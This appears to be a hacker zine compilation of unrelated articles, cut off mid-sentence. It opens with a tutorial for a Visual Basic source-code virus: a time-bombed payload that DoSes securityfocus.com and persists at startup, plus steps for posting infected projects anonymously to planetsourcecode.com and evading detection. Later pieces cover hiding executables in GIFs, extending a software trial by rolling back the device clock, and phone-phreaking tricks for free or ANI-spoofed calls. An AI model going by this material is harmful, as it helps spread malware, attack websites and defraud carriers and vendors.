level VB psudocode that is NOT yet infected
(pretend you are reading the source code in notepad):
________________________________________________

Ok, so a regualr application. Here is what it will look like
when it's hit by this virus:

|  find functions in found frm files            | <- virus source here

|  infect functions with virus source           | <- virus source here

|                                               |
 ------------------------------------------------


Of course it's not that simple, but thats what it does. If there are
more than two subfunctions it ignores the rest. It just finds the first
two functions to infect. If there is only one function or no function or
even if the .frm file is empty for some reason, it does not infect. It
will only infect if it finds the beginning and end of two functions.

I have tried to make the loops as tight and quickly excuted as possible.
Because this is a source code virus, the less code that is copied around
the quicker the execution is executed.

If you are intent on studying this code then there might be a few built in
visual basic 6.0 functions you are unfamilar with. I use this one function 
that is not often used:

"FreeFile" will place a number as the next free open file to use.
When doing VB you can only have so many files open at once. I forget how
many, but there is a limit. You cant use two file numbers at the same time.
For example, you cant do this:

open "c:\autoexec.bat" for input as #1
open "c:\config.sys" for binary read as #1

That's a big nono. You will get errors. This code uses inputs and outputs,
but because its infecting already made code, we dont want to use #1 if
file #1 is already in use. Instead we do this:

dim x as integer
x = FreeFile

Open "C:\autoexec.bat" for input as #x

That works fine. If the code already opend up #1 and #2 and #3 and #4, X
will be 5.

There is not too much more to say except I use lots of "Shell" functions
these allow commands to be fed into cmd.exe while allowing the vb program
to continue to run without waiting for the command to finish executing.

If you need this code to run really fast, take out all of the comments
(except for the markers!) and nice paragraph spacing. This will mean it
will be harder to debug if something goes wrong but it also means less
code to copy around and quicker infection.



3 -   ___---=== Adding a back door ===---___

Ok. I decided NOT to add a back door into this version of the virus. If
you want to have a backdoor in your own virus then you can write one on
your own. It's not hard to write a back door into this virus. I would add
it at the very end of the source as commented out text, then bring that
text to a text file and compile it using vb6's command line compiler.
Voula! Instant EXE back door. Use your n3njh4r skills to make it run at
start up.

The tools I create are my own and no one elses. You should have this same 
philosophy. If you want to add a back door, make your own, and replace
the included payload that I added. Doing this will be very simple because
all you will have to do is replace my "payload" code with your backdoor
code



4 -     ____---=== Adding a payload ===---___

Ok, so instead of adding a back door into this version of the virus, I
decided instead to add a payload. What does the payload do you might ask? 

It DoSs http://securityfocus.com by sending an http request from a socket

Why security focus? Because they publish all the underground soruce codes.
When writing this viurs I thought about putting a very extensive bot that
would connect to dalnet. This bot would respond to many commands such as
DoS functions, proxie functions, keylogger functions, port scanner funct-
ions and a few other not so important functions. All of these would be
controlled through IRC creating a botnet. After thinking about it for a
while, I decided that this is unwise. Anydumbshit could place attacks on
the visual basic open source community with my code that I so tediously
written. This would put the bot code on high alert lists and
shit. People would recognize it right away if I tried to use it for any-
thing important, and there might even be "cleaning tools" written by the
very security focus people that I dispise. This would be doulbe fold self
distruction.

So instead I just included a small piece of code that will DoS that dumb
site. 

This is killing two birds with one stone. If anyone thinks its cool to
spread a virus, then security focus will be hit with lots of traffic, and
the random script kiddy will be cought and put in jail where he will rec-
eive lots of action in the reer, while still allowing people who really
want to learn about the dark side of coding to do so.

The DoS code I included simply compiles itself to an exe, burries itself
in the \system32 file folder and a line of code is written to autoexec.bat
so it gets executed every time the computer starts. It will DoS that bei-
otch with all the sockets the computer can handle, essentially fuXoring
up the computer that it is hosted on. This makes the computer obviously
broken - so we do a time bomb. Why a time bomb? Well when we release it,
we don't want the computers we are infecting to be fucked up right away -
we want them to spread the virus around more, so say we release the virus
on February 1st. This would give the virus a month to spread before it
starts its payload, which will occur immediately after valentines day.

I hate valentines day. Hearts suck. In kindergarden we used to pass around 
hearts to all of our friends. I had the clever idea of passing around farts
instead. My teacher called me a shithead. I never liked valentines day after
that.

So this gives it enough time to spread, but not too much time, because then
a lot of people might find the executable, or even worse, a cleaner tool
might be created to clean the virus traces. Remember, this is a source
code virus that is sitting there in plain text. Its not hard to detect.

I used 2000 sockets per host to DoS the address. This may not look like a
lot, but if the virus infects 10 computers, thats a potential 20000 conn-
ections.

I additionaly added 200 sockets to DoS port 22 which will fuck the admins
around if they try to remotely fix the DoS attacks that are comming at them.

One last note before getting onto the payload source. I added a few tricks
that I learned over time that will help the prevention of shutting down the
program. One of those tricks is in the sub function "Form_Terminate".

When some one tries to shut down the program, the last thing the program
will do before completely shutting down is call itself. This wont work 100%
of the time, but it often does.

Here is the source code for the DoS function.

This is just a simple port flooder. Alone it wont do anything, but after a
lot of computers are infected then this has the potential to take the
website off the intranet, atleast for a while.

Later I will explain how this code will be taken from source code and
compiled into an exe.


5 -     ___---=== Raw viral code ===---___

Here is the virus code that can be used to infect a bunch of other .frm files
It is in three sub functions, and includes option explicit. The main reason
I have included option explicit is because there is a possibility that 
the file it will infect also has option explicit enabled. This just helps
testing the virus to make sure that we dont accidentaly use a variable
that hasnt been delclared. 

To infect other .frm files with this launch code, execute the first sub
fucntion (sub1()), then stop the program (or create a delay that lasts around
4-5 seconds) then execute sub2() sub function. Obviously, visual basic studio
6.0 will be needed.

6 -    ___---=== Viral Code attached to working program (final product)===---___

Here is a program that is infected with the finished and working version of the
virus, with the payload included. All that this needs to spread is for some
dumb vb developer to run this bad boy and all of his vb6.0 programs that are in
X:\program files file folder will be infected (X being the drive that the program
is run on). This will include all of the built in .frm files that visual studio
comes with. Example: some built in .frm files are "FrmAbout" and "FrmDialog" and
"FrmLogin" and so on and so on. Any of these can be added to a vb6.0 project at
any time, and if they are infected, then the virus will continue to spread.

The virus code in this section is the exact same virus code that is in 
section 5, except the code in this section is actualy attached to a working
program, and its 100% ready to go! Use section 5 to help you understand
what exactly is going on in this section.

I found this program that is titled "PortScanner Tutorial" on the internet
somewhere. It is used for port scanning, but thats not what im using it for here.

To use this code, just take the part here marked Form1.Frm and put it into
a text file, then name it "Form1.Frm"

Do the same to the part marked "PortScanner Tutorial.vbp" and "Portscanner
Tutorial.vbw"

Then if you have visual basic 6.0 installed, you can run and compile this 
INFECTED visual basic project.

7 -   ___---=== Executing and spreading virus ===---___


Ok, so even if you do not know anything about programming, source code
viruses, DoS or anything at all in this article, you can still cause
damage. In this chapter I will explain how.

Program Developers get lots of their code from already working programs
from sites such as http://plantsourcecode.com or other free source code
sites. Lots of the time when they need a function or API call or even a
whole program, they dont even try to understand how the code works, or
even look at the code at all. Most of the time, the programmer/developer
will test out the code to see if the program works first, then copy and
paste what is relevent. 

If they run the program whithout looking at the code first, the code can
execute anything it wants and there will be nothing the developer can do
about it. This is the #1 method this source code virus uses to spread.
We will create a real program that works, attach our virus to it then
post it at several sites such as planetsourcecode.com.

If the program looks interesting and/or original, the programmer/developer
will download the program to test it out to see if it is worthy of their
use.

With any luck, the virus will infect a bunch of their code, then it will
also create an exe using its commented code.

Here are the three easy steps to successfully post code at a site that
people will download.

The mark for this example will be planetsourcecode.com, the most widely
used free source code site I know of.

STEP ONE:

Infect an already existing program with this source code virus. It can be
an original program of yours, or just rip one off from planetsourcecode.com
and pretend it is original.


STEP TWO:

Use a proxy, or tor, or a public computer or some other way to annonymously
create an account with planetsourcecode.com


STEP THREE:

While still being annonymous, post the source code. PSC (planet source code)
will ask you to fill in a bunch of fields like "Type API calls used here"
and "Type what this program does here". Make the program sound original,
unique and special in some way. In short, make it sound like your program
is very good and anyone and everyone should be using it. Make people want
to download it.


STEP FOUR:

There is no step four!

And thats that! I recomend not to use the source code that has the virus
already attached that is included in this program because it will be
easily recognized. If you are any good at VB, feel free to modify this
code to make it harder to spot. Change the markers. Switch the amount of
sub functions it infects. Make it somewhat polymorphic and just basicly
make it look differnt.

Any of these will make the source look differnt and harder to spot from
the original. I could have added a polymorph engine, but this would have
significantly added to the size of the file. I think the smaller and
tighter the code, the quicker it will spread from file to file and the
harder it will be to spot.

Here is a short list of sites that people download VB source from. Use
these sites to post your bogus programs

The consepts in this article can be applyed to 90% of all programming
languages and most scripting languages as well, including Delphi, C, C++,

		The Basics of Steganography                       
                                                                     
                                             
Before I start, I should mention that this isn't my original idea. I got it
from malattia, and it wasn't even original to him. Regardless, it's fucking
cool, and I think you'll enjoy it.

Introduction:

What's the difference between data and commands? For example, the string
"print $message" and the command "print $message" look identical, but when
interpreted by a computer they can do very different things. The former
becomes a variable which can be manipulated by a program like any other
string, and the latter becomes part of a script or program that can dire-
ctly perform said manipulation. But they look the same! So where do we
draw the line?

The answer: there really isn't any line. This observation was realized by
John von Neumann when he was collaborating on the ENIAC, one of the first
electronic computer systems. In fact, a common attack of computer systems
involves inserting dangerous code as a variable, and then tricking the
computer into manipulating that variable so it becomes executable code.
For example, in some scripts you can set a parameter "index?q=<script>ma-
liciouscode" that can take the system down.


Basics of Steganography:

Let's take this a step further though. We're not really looking for anyt-
hing malicious here. However, we can take this concept and apply it towar-
ds steganography, the art of embedding secret messages inside of other
media. To get an idea of how basic steganography works, read this sentence:


	Alice tried to avoid Charlie's kiss.

Seemingly innocent, but when we take the first letter from each word, it
unveils a dark secret: ATTACK. We won't get too much more into the symantic
details of steganography-- only enough to get a grasp of what it is. We
only need to know that we can hide one medium inside of another.
 

Programs and Files: Love at First Sight?

Have you ever been using a program, say, Adobe Acrobat, and tried to open
a non-PDF compatible document inside it? Chances are you got an error mes-
sage of some sort. How do programs tell different files from each other?
It's pretty simple: file signatures.

Have you ever seen the hex code for a specific file (either with hexdump or
a general hex editor)? Let's take a look. If we pick a Microsoft Word .doc
file and run "hexdump file.doc" | head", this is the first thing we'll see:
D0 CF 11 E0 A1 B1 1A E1. When Word opens a document and sees this signature
(aka magic number), it recognizes it as a word document. If it sees a hex
sequence like this: 25 50 44 46 (Adobe PDF), it probably won't recognize it.

Now the burning question: can we use a hex editor to manipulate that signat-
ure? Yes and no. You -can- edit the sequence and force a program to open it,
but it's not going to change the jargon spew. Just because the program can 
open the file doesn't trick it into magically interpreting the data.

But we can change that :)

The trick is to combine data used for two different programs and force it
all to coexist. To pull this off, let's take a look at two things: assembly
jump commands, and how code occupies memory space. Understanding how jumps
work is fairly simple. If we pick up a letter that says "Go to the zoo for
a prize", we walk over to the local zoo and get a free soda. Jump commands
work the same way. You have an area in codespace called a label (or subrou-
tine) which acts as a reference. For example:

---begin simple.asm
	mov 	ah, 09h
	jmp message
message:
	mov 	dx, offset message
	message db	"Hello"
	int 21h
---eof

In this code, we have the label "message" defined, and a jump command which
goes to the label. In other words, we jump from point A to point B, and use
the labels to define the points.

Now here's where things start to get interesting. Each command has three
attributes: names, parameters, and offsets. For example, the mov command in
the first line has the name "mov", and the parameters 9h and ah (value and 
destination to store the value-- 09 hex and the high accumulator). The off-
set is simply the area in memory which the code occupies. So what if we sp-
ecify labels in specific memory offsets? Then, we can actually define where
in memory the program code itself is stored.

Say we have a 3*3 grid:

	[]  []  [] 
        []  []  []
        []  []  []

If we have three instructions-- define a variable, jump to another location,
and output the variable's value, we could specify where in memory space the
instructions are. For example:

	[I] [] []
        [] [I] []
        [] [] [I]

But we have six unused spaces left! This means that, in theory, ALTERING
THESE SPACES WILL NOT AFFECT OUR PROGRAM! Now we just have to figure out a
way to manipulate the data so another program can read it. This is where RAW
mode comes in handy. With Jasc Paint Shop Pro (PSP) you can open files in
RAW mode and save them in RAW mode. So let's take our assembled binary and
look at it in RAW mode. Because a file in RAW mode has no predefined height/
width attributes, we'll have to make them up. Really, this is up to the in-
dividual user, and it depends on how we want to manipulate the file. So in
our case, we'll make a rectangle with the attributes (insert attributes).

We can see this illustrated in the following code:

---start jumpingbean.asm (thank you +mala)

	mov ah, 09h
	jmp 1b100
	db 1323 dup 0ffh
1b100:
	mov dx, offset id_msg
	jmp 1b101
	db 1323 0ffh
1b101:
	int 21h
	jmp 1b102
	db 1323 dup 0ffh
1b102:
	ret
	id_msg db "Hello world",13,10,"$"
---eof

This is essentially the same thing as the previous code, save for the "db
1323 dup 0ffh", which reserves the next 1323 bytes, assigning them the value
0ffh; this makes the file exactly 4000 bytes long, which is easy to edit
inside an image editor. However, this on its own will NOT work. Remember,
the file signature is the first step a program uses in determining the kind
of file, which means that a GIF that loads in a web browser, even if it -has-
executable code, will not run properly. Command.com will see the GIF signat-
ure and think "who is this guy?". But let's fall back to the beginning of
the article, and refresh our understanding of steganography. If steganogr-
aphy is the art of hiding messages inside of a medium, then couldn't we
simply hide a picture inside another picture?
 
So here's what we can do. Your compiled assembly code probably looks like
static, so let's turn it into something tacky-- modern art! Given that four
squares of different colors qualifies as art, why shouldn't a framed work of
static? So bring up PSP, and open a new image that's larger than our static
as RAW. Copy/paste our static somewhere in the middle, keeping a frame around
it so we can find the coordinates later, and draw a goofy picture frame, and 
maybe some pseudo-intellectual art student wannabes huddled around it, trying
to relate it to god or something. Save it as a raw, pop it into a hex editor
and insert the signature for a GIF. Now rename it to art.gif, and open it in
a web browser. Presto, the world can now see your code!

Doesn't it feel strange to be looking at your assembly code in Firefox? :) We
should see a fairly boring image with specks scattered about. If you look at
the values for the specs, you'll see that they actually match our code. So
let's take the paintbrush tool and play around with the rest of the image.
We can create whatever picture we want. When we're done, we save it as a GIF,
and it's time to upload our artwork to the internet.

Now here's the finishing touch. Go to another computer, download the file.gif
image, open it in PSP, save it in RAW mode, rename to file.com, and you should
see "Hello, World". Nobody would ever suspect that our n00b message was encoded
in a working program hidden inside an picture file. :)

An Overview of Carrier Access Codes in Edmonton, Alberta.
                                             
Well, a little while ago, I decided that I'd play around with Carrier
Access Codes (CACs) and some other miscellania in my area. All of this
information is relative to western Canada, primarily 780 and 403 (Al-
berta), and 250, 604 and 778 (British Columbia). The information about
what can be done in my area is relative to Edmonton, Alberta. 

A little background on a few CACs. 

1010324 was Telus' primary CAC for the Edmonton area, and most of Alb-
erta, before the merger with BCTEL. Now, 1010323 is Telus' primary CAC,
so 1010323-0 will give you an operator, and 1010324-00 will give you a
long distance operator. The 1010324-0 simply gives you a fast busy.
Same with 1010324-00. So if you sign up for normal Telus long distance,
you'll get 1010323 as your CAC. I don't beleive that Telus has any add-
itional casual-use charges for use of their CAC.

1010424 was BCTEL's primary CAC for it's areas of control in BC, before
the merger with Telus. Post-merger, 1010424 became a "special services"
CAC. In other words, 1010424 was used for people that required special
billing or special features of some sort. 1010424 has varied accessibi-
lity in different areas of Canada. It's accessible from Edmonton, but
that is all that I can verify at this time. I'll explain what I consider
"accessible" to be later on.

A few other carriers also have CACs that are accessible from Edmonton
and surrounding areas, for example Primus (1010615), Bell Canada (1010-
363), and Sprint (1010348).

A Carrier Access Code is a code that enables you to select which long
distance provider you want to handle your calls. For example, if I sign
up for Telus long distance. Let's say that I want to call my friend
"Chris" in Massachusetts (NPA 413). Telus long distance might be 9 cents
a minute, anywhere in Canada and the USA. But, let's say that Sprint has
a special rate of 5 cents a minute to Massachusetts. I'd rather use the
Sprint carrier. So, instead of dialing the number as I normally would
(1-413-445-6666), I would prefix the number with the Carrier Access Code.
This would yeild, "1010348-1-413-445-6666." Dialing this number would
route my call over Sprint's long distance network for this call only.
Dialing in this way (with the CAC prefixed before your number) is refe-
rred to as "Casual Use." Interexchange carriers are will often charge
casual-use calls at a higher rate than the posted long-distance prices.
It is best to verify the casual use rates (if any) with your IXC before
using CACs. 

Anyways, on to the specific behaviour of CACs. Prefixing your call with
a CAC and calling a toll number often results in very different behaviour
than simply direct dialing a toll number. Often, dialing through CACs
yield many restrictions that are not present when direct dialing numbers,
such as restrictions on 900-number dialing, 800/888/877/866 toll-free
number dialing, 950-XXXX (Feature Group B) dialing, 700-number dialing,
and many other restrictions. Often, attempting to dial a local number
through a CAC will yeild a Cannot-Be-Completed-As-Dialed (CBCAD) error,
or simply a fast-busy. This is expecially evident in many parts of the
USA and Eastern Canada. However, when dialing local numbers through CACs
in Edmonton and many other parts of Western Canada, the restrictions are
slightly different. I will explain the behaviour below.

For those readers that are not familier, Telus has a very lax system,
when it comes to dialing formatting for local numbers. Any of the fo-
llowing will complete properly, and charge as a local call:

958-6111
780-958-6111
1-780-958-6111

So you can see there is a lot of flexibility on how you want to dial your
local calls. Both 958-6111 and 780-958-6111 will terminate normally, and
ring the party after you've finished dialing. 1-780-958-6111, however,
will play a message that states, "Your local call is proceeding. There is
no need to dial long distance. Thank you, from Telus," before completing
your call (assuming you called a number that terminated properly, and
didn't intercept, or do something weird).

All CACs in my area have fairly standard behaviour when it comes to dial-
ing local numbers. Also, this behaviour is quite different than normal
direct-dialing. Normally, you dial the whole number as one string, and
the entire string is parsed at once. However, certain CACs can be made to
match at the thousands block, instead of waiting for the entire string to
be dialed. The situations that will cause a CAC to match at the thousands
block are as follows. Note that it is assumed that the conditions below
are prefixed with a CAC. Note that these are also general situations,
there are specific situations that can cause other specific intercepts,
those will be listed and explained later.

1. Dialing a local number that is in the same exchange (NXX) as you. 
For example, if my number was "780-444-5555", and I dialed, "1010424
-1-780-444-5556", my pattern would be matched at the thousands block
(which is the first "5", in case you weren't aware), and will immedi-
ately intercept. The exact intercept it gives is discussed later.

2. Dialing a local number that is outside of the city you live in.
For example, if I lived in Edmonton, and I dialed an exchange in
Sherwood Park (which is just outside of Edmonton), such as 464, it
would again, intercept at the thousands block. Sherwood Park is
normally a local call when direct dialed.

3. Dialing a cellular prefix within your city.
For example, if "903" is a cellular prefix in Edmonton, then dialing
"1010424-1-780-906-6" will intercept after I dial the thousands block
(the last "6"), before I can finish entering the number. 

All of these conditions will give the same intercept. As soon as you
finish dialing the the thousands block, it will ring for a certain
amount of time, then the call will intercept to a recording of "Your
local call is proceeding. There is no need to dial long distance.
Thank you, from Telus." Then, you'll hear a quarter-second snippet
of some other intercept recording on the switch (which is a documented
DMS bug that has never been fixed, likely because it occurs so rarely,
and isn't really an annoyance). Following the snippet, you will hear
ringing. You will then hear an intercept message. Note that the inter-
cept message can sometimes come on *before* the ringing, and the ring-
ing will be heard overlayed on the error message. The error message
states, "The number you have called cannot be completed as dialed.
Please check the area code and number before trying again, or dial
411 for directory assistance." This error will repeat three times,
and on the third time, it will but off before it can get to the word,
"assistance." Also note that dialing a local number prefixed with a
CAC doesn't actually go through the CAC. So, even though you might 
not have Bell Canada long distance, you can still dial a local number
(subject to the previous requirements) prefixed with a CAC.

A bit more on local calling through CACs. I wanted to get another
viewpoint on this interesting situation, so I called up the Telus
Network Operations Center, and talked to a fellow in DMS Switching,
Jason. He was on break, but he took some time to talk to me, which I
really appreciate. When I explain what I had encountered with not
being able to call cellular numbers, or out-of-city numbers through
any CACs, he noted a few things that he thought might cause that. He
mentioned that it was possible that the switches would not route
*local* calls prefixed with a CAC from tandem to tandem, but would
only route them from tandem to end-offices. So, any end-offices not
directly connected to the tandem would not be able to be contacted,
and he speculated that was why only calls within the city of Edmonton 
could be made through the CACs. Of course, this was speculation, and
it would be appreciated if someone outside of Edmonton could verify
that you really can, only call numbers in your city. I also discussed
the issue of not being able to call numbers on your own exchange with
Jason, he attributed it to switch programming as well, but neither of 
us were aware of any particular hardware restriction or regulation
that would require it to be so. By all rights, it should work. Either
way, thanks Jason for the comments!

Alright, a bit more on 1010424. As I previously stated, 1010424 is a
CAC that is now used for "special services." Not every regular casual
caller can use all the features on the line. Some of the following
conditions will cause 1010424 to tell you, "We're sorry, you are not
authorized to call the number dialed."

1. Dialing a Feature Group 'B' number
    ex: 1010424-1-780-950-8888

2. Dialing 1010424-0 (operator)

3. Dialing 1010424-00 (long distance operator)

4. Dialing any long-distance number
    ex: 1010424-1-604-477-1452. Note that it doesn't matter if the
number supervises or not, it still intercepts to that message.

5. Dialing 1-780-555-1212

This illustrates where 1010424 contrasts with 1010323. All of the
previous stated conditions are conditions that would require the
"special billing" parts of the system to be activated. Simply
dialing local calls, within your own city, and not on your own
switch, however, are local calls, and like most of Telus-land,
free. So the "special billing" stuff never has to get activated.
Also note, you can still dial 1-700-555-4141 and it'll tell you
that "Telus" is your long-distance carrier. So if you want to
verify that this is a valid CAC for Telus, you can, right like
that. 

Alright, a bit more about 1010323. 1010323 is the normal Telus
CAC, and you can place calls normally through it. 1010323-0
yields you an operator, 1010323-00 gets you a long-distance
operator. You can place long-distance calls normally, and "sp-
ecial" stuff like Directory Assistance (1-NPA-555-1212) works
normally, and when you dial through and place local calls, with
the restrictions I listed above on local calls.

Alright, a bit more on some other CACs. Bell Canada's CAC is
1010363, and it's quite similar to Telus' 1010323, with a few
notable differences. You can't call an operator (via either
1010363-0 or 1010363-00) through Bell's CAC, at least, I've
never gotten one. It might be possible to get an operator if
you are subscribed to the service, but I've never gotten one.
Comments, anyone? Also, if you dial up 1010363-1-700-555-4141,
you'll get a nice messages telling you that Bell Canada is your
long distance provider. Trying to make a normal long distance
call, though, will net you the message, "We're sorry, the ser-
vice you are calling cannot be reached by this method."

Primus also runs 1010615, which is entirely unremarkable, except
for 1010615-0, which will get you an automated attendant. I'm
not sure if Primus has any additional casual-use charges. Telus'
old CAC, 1010324, will intercept with the message, "This service
is no longer available in your area. We apologize for the inco-
nvenience," no matter what you try to call. Sprint runs a CAC
as well, 1010348, which is again, entirely unremarkable.


That's about it. Comments, anyone?


Thanks to Jason @ Telus NOC - DMS Switching - For information
about 1010424 and special billing, and to sn9.

           Using Pocket Tunes Deluxe Trial Without A Limit
            - by aciddata / o4.2o06.27


Pocket tunes is a music player for PalmOS & Tungsten T.

(www.pocket-tunes.com)

The palm comes often with a standard version of pocket tunes. But this
standard version does not support features like internet radio and so
on.

You can make an update of your current version to a pocket tunes deluxe
version. With this new update to pocket tunes deluxe you can use a full
version as a 15 days trial. Now you can listen to internet radio and so
on but like said, this trial is only for 15 days, too bad.

Every time you start pocket tunes deluxe you will see a screen with the
following text and buttons:

 - - - -
 "You have 11 days remaining in your trial of Pocket Tunes Deluxe.
  You can purchase this upgrade at pocket-tunes.com.

  Tap "End Trial" to stop using the added features of Pocket Tunes
  Deluxe and return to your free version of Pocket"

  [ Ok ] [ Register... ] [End Trial]
 - - - -

Every day you will see a lower number of the remaining days. Just hit
Ok or do the following move, I found a simple way to use your trial
version so long how you want without cracking it. Here is how it will
be done well:

Go to your "date/time" menu of your palm and set the date 4 days back,
or some days. Now go back to your trial version of pocket tunes delux
and you will see the following screen: "You have 15 days remaining in
your trial of Pocket Tunes Deluxe." -- Wow, so easy, too easy. Cool.
I am not sure if this function with every piece of trial software for
the palm out there.

[Edit]: If no days are left and the trial is gone it seems it is a
little bit difficult to get this service again. Even if you delete the
newer version of pocket tunes deluxe and make a new update, the actual
is 3.1.5, pocket tunes will not use the deluxe functions again. But
here is also a way to solve that problem: download an older version of
pocket tunes deluxe, version 3.1.3, install it and enjoy the (internet)
music. It seems that here is the same thing with the date'n'trial trick.
Do not let your trial days go - always change your date on your palm.

Have fun with your full & time unlimited version of pocket tunes deluxe,
enjoy your (internet) sound and fresh up your mind with it.

| Hey Kids! I'm back again, with another phile detailing the grimy details of Microsofts "high security"|
| roadblock called "Windows Genuine check". This little bugger is designed to stop you from downloading |
| stuff from microsoft if they think you serial is invalid. "Hey," your thinking. "hey, I don't have to |
| worry about this stuff, My copies legal!" Think again, if microsoft so much as gets the idea your ser-|
| ial is illegeal they will prevent you from installing things like directX. I have had two bad run-ins |
| with this program, the first time with my dads work computer. He received a new laptop from work, but |
| was unable to view his online courses he was supposed to take. No problem, I just needed to update his|
| Active X. So I go to microsofts site, and navigate to the download for activeX. Whats this? Validation|
| check? No problem I download their lame program, run it, copy the number it spits out and paste it in |
| to the little box. Hmm.. okay. Apparently I can't download active X because my serial is shared. Okay,|
| thanks for that handy piece of information microsoft, but how do I download activeX then? Thousands of|
| company computers use shared serials, what about them? The second time I ran into this problem was at |
| a friends. His motherboard and CPU were damaged and had to be replaced. We installed windows on the   |
| repaired system and needed to get a file. Like nice little consumerists, we logged into the microsoft |
| website and ran the genuine check utility. Since our serial was allready registered on the old system,|
| (wich now lay burned in the trash) we couldn't install it. Our serial was "stolen" apparently.        |

The Temporary Autonomous Zone
Presented at Notacon 3
7 April 2006

I stand in front of you to relate experiences and philosophies, lessons
learned and concepts grasped, in proposal of an idea which blends seam-
lessly in and out of the objective notion of human existence.

Before we delve too deeply into a political theory of human interaction,
we need to cover the basic stepping stones to ensure we're on the same
page. I'll refer to Henry David Thoreau, who in Walden discovered that
if we try to separate ourselves from the natural technological progre-
ssion of society, we inevitably create our own patterns and subconsio-
usly imprint them upon our surroundings. Regardless of whether he was
living off Emerson's pocket, his observations, while juvenile, serve a
very enlightening purpose. For just a moment, the uneducated man can
stop, reflect on his daily routine, and realize that no matter what the
change, no matter how chaotic he thinks it might be, life will always
form a cyclic pattern around his actions.

We can all see routine in our lives. We learn it from our imprimers
(parents, guardians, influencers) and bestow it upon our successors.
Some routine is based on our biological makeup: sleep patterns derive
from our circadian rhythm, eating and waste confer to metabolism and
labor, and active physical movement keeps our bodies from growing
stagnant. We must keep moving and evolving to stay alive. Other rout-
ines are cultural: the types of food we eat, how we work and move
(dependant on physical landscape as well as the technology we have),
and in general the mood of the people reflects how prosperous a culture
is.

This cycle is reflected on a wider scope when we consider the interco-
urse of men. In Plato's Republic, Socrates describes how a small vill-
age consists of few people, each of whom contribute something to the
whole. As more people populate, markets form to allow broader trade,
and the people's lives adapt to fit not only their individual biological
needs, but those of others. When we look at the stock markets, we are
seeing this principal carried out to serve an entire country.

Most people spend their lives in this cyclic adaptation, adjusting mi-
nute details of their lives to accomodate changes (supply/demand of
labor, children, etc). The things they consider important are those
which either sustain their existence, or allow more comfort. An imba-
lance between existence and comfort, whether it be living a monotonous 
life ("all work and no play"), or spending one evening in glamour only
to suffer your depleted resources for the next month or year, can lead
to depression. Some people are able to gamble well (good investments)
and come out with a higher general comfort level.

This balancing game is so complex and thought-consuming that these pe-
ople never stop to observe the nature of the cycle which propels them.
Those we do are either experts in their fields and given leadership
roles (at least, according to Socrates), or step outside and become
observers, philosophers. Those who do can appreciate political evolu-
tion- from an autonomous small village to an interconnected metropolis
where, to properly function, certain stipends and limitations must be
placed to statify the society into a working whole.

Ned Ludd is famous for leading revolts against English textile facto-
ries in the early 1800s, whose followers, since called Luddites, per-
sist today in protests against people who they view have unfair power
and money. The English rebels are no strangers in this battle, which
has resulted in Marxism, Communism, and Democracy. We can identify 
specific stages (or political systems) in societal evolution, some
noted by growth and others by destruction. Rome rose and fell. It is
this rotating process which true philosophers identify as anarchy--
not the "smash the system" approach so many idiots take.

When we realize this cycle exist, we can further see that because men
are imperfect, their societies are imperfect. Underneath major cities,
whole networks of subway systems lay abandoned from obselescence.
Likewise, if buildings and structures are able to escape the rotation,
people who can identify the stages and predict them are also able to 
escape.

When we understand how the cycle works, we can interpose changes that
will go unnoticed. If we can find a crack, explore it, and build a
world of our own design, provided we destroy it ourselves before it is
discovered, we can recreate it as many times as we want. In this self-
created world, we create our own society, and we create our own rules.
This world is the Temporary Autonomous Zone.

A Bit of the Telephonic Real in 2005-2006


The 718 Extender
800-555-3775
The New Bell Canada BOCOTs
The Medlink Conferences


***800-555-3755 - British Telecom International***

Somewhere around mid-2005, someone stumbled on an interesting system while
scanning. It was a PBX, run by British Telecom International (BTI). I
believe the number first appeared in the Phreaks and Geeks Number Directory,
Spring 2005. It was just listed as "Extender", if I recall. The first time
it was called, it pretty much just spit out a dialtone. A lil' bit of expl-
oration showed that you could dial 6 digits, then you'd get a *click, then
another dialtone. The first dialtone was a code of sorts and the second
allowed you to dial the number you wanted to reach. A bad code would give
you a fast busy after you finished dialing the number you wanted to reach.
A pretty straightforward extender set up. I guess that's why it was just
listed as "Extender" in PnG NumDir Spring 2005.

It was interesting, though, underneath all that uselessness. The interesting
feature of this particular extender was the fact that it would allow you to
dial certain numbers without entering a valid code. I'm sure you can figure
that as soon as phone phreaks figured this out, it was well-used. Really,
the only thing you could dial was a long-distance operator, but that in it-
self was enough to make this one quite popular. Fortunately, the details of 
this particular system never made it into that directory, so it stayed up
for a fairly long time.

The system started to see significant use in the fall of 2005. Someone dis-
covered the fact that you could enter any series of 6 digits, then hit the
keys for a long-distance operator. And suprise of suprises, she asked for
the number you were calling from. It seemed that the operators for this
system were unable to get ANI on calls passing through here. And who said
VoIP was the only way to spoof your number? Sure, maybe it isn't as easy as
AT&T's 10-10-288 system, but it's still nice. It didn't work 100% of the
time, though. Sometimes, the operators wouldn't put your call through, and
you'd have to call back again, and try on a different operator. Another
downside, though, was that you couldn't flash over and three-way someone
when calling this number. But still, the benifits must have outweighed the
disadvantages, since it was gettin' used.

The BTI operator couldn't put calls through to international numbers, though.
Well, she could, but the sound was so incredibly bad. Like, the quality was
just horrible, like you were talking across the atlantic with two coke cans
and a string. To work around that, what a lot of phone phreaks ended up doing
was hopping through an operator number in the USA, then getting them to place
the call. Mostly, people seemed to be using the Verizon backdoor number that
was public for a bit. Anyways, the BTI number stayed as billable for a long
time, but pretty soon Verizon was filtering the calls. So, you could then ask
the Verizon lady to transfer you to AT&T, and then get AT&T to place the int-
ernational call. So, if you wanted to call your friend in Australia, you'd
call up 800-555-3775, then call up the number for a Verizon operator, then
get transferred to AT&T, and then place your call to your destination. It was 
definately a good system.

The end was thought to have come in Febuary of 2006, when, apparently, BTI
got around to marking this number as non-billable. But that wasn't really it,
as you could still get the BTI operator to place calls to destinations within
the continental USA. The end really came in March 2006, and now if you call
this number, and try calling the long distance op (00), you just get a fast
busy. Oh well.



***The New Bell Canada BOCOTs***

Last year, Bell Canada put these new BOCOTs in. They rocked. When they first
went in, everyone was all over them. Nice new Milleniums, owned by Bell
Canada, though, instead of Telus. It was nice to see a break from Telus'
payphone monopoly. They were being put up in a lot of places like Tim Hortons
OnTheRun stores, those little things in Petro-Can or Esso or whatever it is.
Anyways, not much to say about these, other than there was an exploit for a
while, where you could put in your own carrier-access-code, and get a free
call. That's about it,


***The Medlink Conferences***

In early-2005, someone stumbled over the number (800.456.7800) for this East-
Coast company, MedLink Imaging, while random-scanning. The company was nothing
special, they sold x-ray and medical imaging products. What was interesting, 
though, was their phone system. I don't know what it was that made the finder
keep digging into this system, but it was a nice thing that they did. The
system had mostly easy-to-guess passwords, I guess access was never really
an issue, but just how it turned out was somewhat interesting.

Anyways, what was especially interesting about the system was that there was
